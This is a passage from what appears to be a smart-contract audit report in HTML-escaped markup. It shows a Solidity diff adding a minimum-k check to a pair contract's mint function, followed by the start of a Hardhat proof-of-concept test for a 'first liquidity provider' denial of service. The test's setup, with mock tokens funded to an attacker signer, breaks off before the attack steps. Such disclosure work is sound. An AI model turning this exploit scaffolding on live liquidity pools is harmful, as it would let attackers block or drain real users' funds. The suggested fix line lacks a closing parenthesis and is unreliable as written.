Math.sqrt(_amount0 * _amount1) - MINIMUM_LIQUIDITY;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            _mint(address(0), MINIMUM_LIQUIDITY); // permanently lock the first MINIMUM_LIQUIDITY tokens\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+           if (stable) { require(_k(_amount0, _amount1) \u0026gt; MINIMUM_K; }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        } else {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            liquidity = Math.min(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                (_amount0 * _totalSupply) / _reserve0,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                (_amount1 * _totalSupply) / _reserve1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        require(liquidity \u0026gt; 0, \u0026quot;ILM\u0026quot;); // Pair: INSUFFICIENT_LIQUIDITY_MINTED\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        _mint(to, liquidity);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        _update(_balance0, _balance1, _reserve0, _reserve1);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        emit Mint(msg.sender, _amount0, _amount1);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"proof-of-concept-4\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-4\" aria-label=\"proof of concept 4 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cdetails\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"31\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e } = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;chai\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e { \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e } = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;hardhat\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003edescribe\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Pair Vulnerability Test (First Liquidity Provider DOS)\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edai\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Added PairGenerator\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// To interact with the Pair contract instance\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMINT_AMOUNT\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBigNumber\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;10000000\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// 10_000_000 wei (as in PoC)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eINITIAL_TOKEN_SUPPLY_FOR_ATTACKER\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eutils\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eparseEther\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;10000\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// 10,000 full tokens\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebeforeEach\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003easync\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        [\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetSigners\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Deploy Mock ERC20 tokens\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockERC20Factory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetContractFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;MockERC20\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edai\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockERC20Factory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeploy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Dai Stablecoin\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;DAI\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edai\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeployed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMockERC20Factory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeploy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Frax Stablecoin\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;FRAX\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeployed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Mint tokens to attacker\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edai\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eINITIAL_TOKEN_SUPPLY_FOR_ATTACKER\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eINITIAL_TOKEN_SUPPLY_FOR_ATTACKER\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Deploy PairGenerator\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairGeneratorFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetContractFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;PairGenerator\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairGeneratorFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeploy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeployed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Deploy PairFactory\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairFactoryFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetContractFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;PairFactory\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePairFactoryFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeploy\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edeployed\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Initialize PairFactory\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003einitialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairGenerator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Get Pair contract factory for later use\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetContractFactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Pair\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, 